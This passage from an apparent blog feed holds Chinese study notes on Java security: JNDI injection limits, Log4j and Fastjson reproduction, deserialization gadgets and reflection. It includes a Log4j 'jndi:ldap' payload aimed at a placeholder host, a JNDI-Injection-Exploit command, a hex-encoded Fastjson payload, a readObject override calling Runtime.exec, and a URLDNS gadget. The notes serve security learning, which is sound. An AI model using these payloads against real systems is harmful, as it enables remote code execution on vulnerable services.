6u45、7u21之后：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。  </p></li><li><p>JDK 6u141、7u131、8u121之后：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。</p></li><li><p>JDK 6u211、7u201、8u191之后：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，<br>禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。</p></li></ul><h3 id="高版本绕过："><a href="#高版本绕过：" class="headerlink" title="高版本绕过："></a>高版本绕过：</h3><p><a href="https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/">https://www.mi1k7ea.com/2020/09/07/%E6%B5%85%E6%9E%90%E9%AB%98%E4%BD%8E%E7%89%88JDK%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E5%8F%8A%E7%BB%95%E8%BF%87/</a><br><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a>  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36安全开发-JavaEE应用</title>
      <link href="/2023/10/18/36%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/36%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>38、JavaEE-组件安全-Log4j</li><li>39、JavaEE-组件安全-Fastjson</li><li>40、JavaEE-基本了解-JNDI-API</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li></ul><p> <img src="/2023/10/18/36%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/jndi.png"></p><h2 id="三方组件"><a href="#三方组件" class="headerlink" title="三方组件"></a>三方组件</h2><p>Jar仓库：<br><a href="https://mvnrepository.com/">https://mvnrepository.com/</a>  </p><p>Maven配置：<br><a href="https://www.jb51.net/article/259780.htm">https://www.jb51.net/article/259780.htm</a>  </p><p>JNDI注入：(见图)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Java Naming and Directory Interface (Java 命名和目录接口 )，JNDI 提供统一的客户端 API，通过不同的服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录服务，使得 JAVA 应用程可以通过 JNDI 实现和这些命名服务和目录服务之间的交互。  </p><h2 id="Java-三方组件-Log4J-JNDI"><a href="#Java-三方组件-Log4J-JNDI" class="headerlink" title="Java-三方组件-Log4J&amp;JNDI"></a>Java-三方组件-Log4J&amp;JNDI</h2><h3 id="Log4J："><a href="#Log4J：" class="headerlink" title="Log4J："></a>Log4J：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p><h3 id="Log4j-组件安全复现"><a href="#Log4j-组件安全复现" class="headerlink" title="Log4j-组件安全复现"></a>Log4j-组件安全复现</h3><p>1、Maven引用Log4j<br>2、接受用户输入值<br>3、Log4j处理错误输入<br>4、利用jndi-ldap执行  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Test:</span><br><span class="line">String code=<span class="string">&quot;test&quot;</span>;</span><br><span class="line">String code=<span class="string">&quot;$&#123;java:os&#125;&quot;</span>;</span><br><span class="line">logger.error(<span class="string">&quot;&#123;&#125;&quot;</span>,code);</span><br><span class="line">String exp=<span class="string">&quot;$&#123;jndi:ldap://xx.xx.xx.xx:xx/xxx&#125;&quot;</span>;</span><br><span class="line">服务器：</span><br><span class="line">java -jar JNDI-Injection-Exploit.jar -C <span class="string">&quot;calc&quot;</span> -A xx.xx.xx.xx</span><br></pre></td></tr></table></figure><h2 id="Java-三方组件-FastJson-反射"><a href="#Java-三方组件-FastJson-反射" class="headerlink" title="Java-三方组件-FastJson&amp;反射"></a>Java-三方组件-FastJson&amp;反射</h2><h3 id="FastJson："><a href="#FastJson：" class="headerlink" title="FastJson："></a>FastJson：</h3><p>[将数据格式修改为json，并加入json数据，如果没有源代码，那么类名一般就写公有类，value值写成”247b6a6e64693a6c6461702f2f7878787d”格式。(这串字符用ASCII hex解码即可看到，因为这里直接写出来会屏蔽)]<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在前后端数据传输交互中,经常会遇到字符串(String)与json,XML等格式相互转换与解析，其中json以跨语言，跨前后端的优点在开发中被频繁使用，基本上是标准的数据交换格式。它的接口简单易用，已经被广泛使用在缓存序列化，协议交互，Web输出等各种应用场景中。FastJson是阿里巴巴的的开源库，用于对JSON格式的数据进行解析和打包。</p><h3 id="Fastjson-组件安全复现"><a href="#Fastjson-组件安全复现" class="headerlink" title="Fastjson-组件安全复现"></a>Fastjson-组件安全复现</h3><p>1、Maven引用Fastjson<br>2、创建需转换类对象User<br>3、使用Fastjson进行数据转换<br>4、数据转换(对象转Json,Json转对象)  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-对象转Json(带类型)  </span><br><span class="line">JSONObject.toJSONString(u)</span><br><span class="line">JSONObject.toJSONString(u,SerializerFeature.WriteClassName)</span><br><span class="line">-Json转对象</span><br><span class="line">JSON.parseObject(exp)</span><br><span class="line"></span><br><span class="line">Test:</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><p>服务器：<br><a href="https://blog.csdn.net/guo15890025019/article/details/120532891">https://blog.csdn.net/guo15890025019/article/details/120532891</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>35安全开发-JavaEE应用</title>
      <link href="/2023/10/18/35%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/35%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>35、JavaEE-反序列化-解释&amp;使用&amp;安全</li><li>36、JavaEE-安全-利用链&amp;直接重写方法</li><li>37、JavaEE-安全-利用链&amp;外部重写方法</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li></ul><p> <img src="/2023/10/18/35%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961.png"><br> <img src="/2023/10/18/35%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%962.png"></p><h2 id="序列化-反序列化技术"><a href="#序列化-反序列化技术" class="headerlink" title="序列化&#x2F;反序列化技术"></a>序列化&#x2F;反序列化技术</h2><ul><li><p>1、序列化与反序列化<br>序列化：将内存中的对象压缩成字节流<br>反序列化：将字节流转化成内存中的对象  </p></li><li><p>2、为什么有序列化技术<br>序列化与反序列化的设计就是用来传输数据的。<br>当两个进程进行通信的时候，可以通过序列化反序列化来进行传输。<br>能够实现数据的持久化，通过序列化可以把数据永久的保存在硬盘上，也可以理解为通过序列化将数据保存在文件中。<br>应用场景<br>(1) 想把内存中的对象保存到一个文件中或者是数据库当中。<br>(2) 用套接字在网络上传输对象。<br>(3) 通过RMI传输对象的时候。  </p></li><li><p>3、几种创建的序列化和反序列化协议<br>• JAVA内置的writeObject()&#x2F;readObject()<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果对方使用的是这种方法，那么就可以利用hashmap或重写来触发readObject，如果对方打印输出了反序列化结果，那么也可以利用toString来实现攻击。但是上述的这些方法，都取决于对方用的序列化与反序列化协议是writeObject与readObject。（攻击原理有3种，第1就是重写readObject，对方反序列化时由于用到了readObject，那么此时就会去调用readObject这个方法，但是如果我们自己也写了个与java本身的readObject名称一样的方法，那么对方执行的时候会将系统本身的readObject与我们写的readObject方法都执行一遍，假设我们写的readObject设定了弹出cmd，那么对方反序列化的时候就会弹出cmd。）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第2种攻击方法hashmap，原理就是hashmap本身自己就定义了readObject，且这个readObject是自带的，且hashmap中的readObject会自动解析dns，也就是说如果我们塞进去的是一个危险网页，那么它一样会进行访问，如果这个网页中存在挂马之类的东西，危害可想而知。当然，第二种方法想要实现，那么对方必须同时使用hashmap和readObject。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;第3种攻击方法就是toString方法。如果对方在反序列化的时候同时输出了结果，那么就会执行toString中的代码，如果我们在代码中输入了打开计算器，那么对方在打印结果的时候就会自动打开计算器。这种方法必须得对方打印了反序列化的输出结果才有用，否则不生效。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上述方法的这些方法必须建立在对方序列化与反序列化时，使用的是writeObject与readObject，否则都是不生效的。对方使用的序列化与反序列化的方法不同，那么我们的攻击方式也会有所不同，上述的攻击方法都建立在readObject的利用上，所以对方一旦使用的不是readObject，那么这些方法就会失效。<br>• JAVA内置的XMLDecoder()&#x2F;XMLEncoder<br>• XStream<br>• SnakeYaml<br>• FastJson<br>• Jackson  </p></li><li><p>4、为什么会出现反序列化安全问题<br>内置原生写法分析<br>• 重写readObject方法<br>• 输出调用toString方法  </p></li><li><p>5、反序列化利用链<br>(1) 入口类的readObject直接调用危险方法<br>(2) 入口参数中包含可控类，该类有危险方法，readObject时调用<br>(3) 入口类参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用<br>(4) 构造函数&#x2F;静态代码块等类加载时隐式执行(例如：tostring)</p></li></ul><h2 id="Java-原生使用-序列化-反序列化"><a href="#Java-原生使用-序列化-反序列化" class="headerlink" title="Java-原生使用-序列化&amp;反序列化"></a>Java-原生使用-序列化&amp;反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//进行序列化对象并写入文件ser.txt</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeTest</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//读入Filename进行反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializeTest</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();        </span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Java-安全问题-重写方法-触发方法"><a href="#Java-安全问题-重写方法-触发方法" class="headerlink" title="Java-安全问题-重写方法&amp;触发方法"></a>Java-安全问题-重写方法&amp;触发方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">toString <span class="comment">//输出调用toString方法</span></span><br><span class="line"><span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;xdsec&quot;</span>,<span class="string">&quot;man&quot;</span>,<span class="number">30</span>);</span><br><span class="line">System.out.println(u);</span><br><span class="line">serializeTest(u);</span><br><span class="line">unserializeTest(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">readObject <span class="comment">//序列化后被重写readObject调用</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//指向正确defaultReadObject</span></span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Java-安全问题-可控其他类重写方法"><a href="#Java-安全问题-可控其他类重写方法" class="headerlink" title="Java-安全问题-可控其他类重写方法"></a>Java-安全问题-可控其他类重写方法</h2><p>参考：<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a>  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">UrlDNS.java  </span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example.serdemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNS</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://xxxx.dnslog.cn&quot;</span>);</span><br><span class="line">        hashmap.put(url,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//进行序列化对象hashmap</span></span><br><span class="line">        serializeTest(hashmap);</span><br><span class="line">        <span class="comment">//进行反序列化dns.txt</span></span><br><span class="line">        unserializeTest(<span class="string">&quot;dns.txt&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeTest</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">//进行序列化对象并写入文件dns.txt</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;dns.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserializeTest</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">//读入Filename进行反序列化</span></span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> ois.readObject();<span class="comment">//默认调用ObjectInputStream里的readObject();</span></span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>34安全开发-JavaEE应用-java反射</title>
      <link href="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/"/>
      <url>/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/07/22%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-php%E5%BA%94%E7%94%A8/">22安全开发</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>32、JavaEE-反射机制-开发和安全应用场景</li><li>33、JavaEE-反射机制-类&amp;成员变量&amp;方法&amp;构造方法操作</li><li>34、JavaEE-反射机制-安全应用&amp;反射执行&amp;反序列化链相关</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>1、PHP：<br>功能：新闻列表，会员中心，资源下载，留言版，后台模块，模版引用，框架开发等<br>技术：输入输出，超全局变量，数据库操作，逻辑架构，包含上传&amp;下载删除;<br>技术：JS&amp;CSS混用，Cookie,Session操作，MVC架构，ThinkPHP引用等。<br>安全：原生PHP开发安全，模版引用安全，第三方插件安全，TP框架安全等  </li><li>2、JS：<br>功能：登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等<br>技术：原生开发，DOM，常见库使用，框架开发（Vue，NodeJS），打包器(Webpack)等<br>安全：原生开发安全，NodeJS安全，Vue安全，打包器Webpack安全，三方库安全问题等  </li><li>3、Java：<br>功能：数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等.<br>框架库：MyBatis，SpringMVC，SpringBoot，Shiro，Log4j，FastJson等<br>技术：Servlet，Listen，Filter，Interceptor，JWT，AOP，待补充<br>安全：SQL注入，RCE执行，反序列化，脆弱验证，未授权访问，待补充<br>安全：原生开发安全，第三方框架安全，第三方库安全等，待补充</li></ul><p> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB.png"><br> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB2.png"><br> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB3.png"><br> <img src="/2023/10/18/34%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-JavaEE%E5%BA%94%E7%94%A8/java%E5%8F%8D%E5%B0%84%E7%B1%BB4.png"></p><h2 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h2><ul><li><p>1、什么是Java反射<br>参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a><br>Java提供了一套反射API，该API由Class类与java.lang.reflect类库组成。<br>该类库包含了Field、Method、Constructor等类。<br>对成员变量，成员方法和构造方法的信息进行的编程操作可以理解为反射机制。  </p></li><li><p>2、为什么要用到反射<br>参考：<a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其实从官方定义中就能找到其存在的价值，在运行时获得程序或程序集中每一个类型的成员和成员的信息，从而动态的创建、修改、调用、获取其属性，而不需要事先知道运行的对象是谁。划重点：在运行时而不是编译时。（不改变原有代码逻辑，自行运行的时候动态创建和编译即可）  </p></li><li><p>3、反射机制应用<br>开发应用场景：<br>Spring框架的IOC基于反射创建对象和设置依赖属性。<br>SpringMVC的请求调用对应方法，也是通过反射。<br>JDBC的Class#forName(String className)方法，也是使用反射。  </p></li><li><p>4、安全应用场景：<br>构造利用链，触发命令执行<br>反序列化中的利用链构造<br>动态获取或执行任意类中的属性或方法<br>动态代理的底层原理是反射技术<br>rmi反序列化也涉及到反射操作</p></li></ul><h2 id="Java-反射-Class对象类获取"><a href="#Java-反射-Class对象类获取" class="headerlink" title="Java-反射-Class对象类获取"></a>Java-反射-Class对象类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1、根据类名：类名.class</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">userClass</span> <span class="operator">=</span> User.class;</span><br><span class="line"><span class="comment">//2、根据对象：对象.getClass()</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> user.getClass();</span><br><span class="line"><span class="comment">//3、根据全限定类名：Class.forName(&quot;全路径类名&quot;)</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass1</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"><span class="comment">//4、通过类加载器获得Class对象：//ClassLoader.getSystemClassLoader().loadClass(&quot;全路径类名&quot;);</span></span><br><span class="line">ClassLoader clsload=ClassLoader.getSystemClassLoader();</span><br><span class="line"><span class="type">Class</span> <span class="variable">aClass2</span> <span class="operator">=</span> clsload.loadClass(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="Java-反射-Field成员变量类获取"><a href="#Java-反射-Field成员变量类获取" class="headerlink" title="Java-反射-Field成员变量类获取"></a>Java-反射-Field成员变量类获取</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.example.reflectdemo.User&quot;</span>);</span><br><span class="line"><span class="comment">//获取公共成员变量对象</span></span><br><span class="line">        Field[] fields=aClass.getFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:fields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取所有成员变量对象</span></span><br><span class="line">        Field[] fields=aClass.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span>(Field f:fields)&#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取公共，私有单个成员变量对象</span></span><br><span class="line">        Field field=aClass.getField(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">        Field field=aClass.getDeclaredField(<span class="string">&quot;gender&quot;</span>);</span><br><span class="line">        System.out.println(field);</span><br><span class="line"></span><br><span class="line"><span class="comment">//城边变量值获取和赋值</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">u</span> <span class="operator">=</span> <span 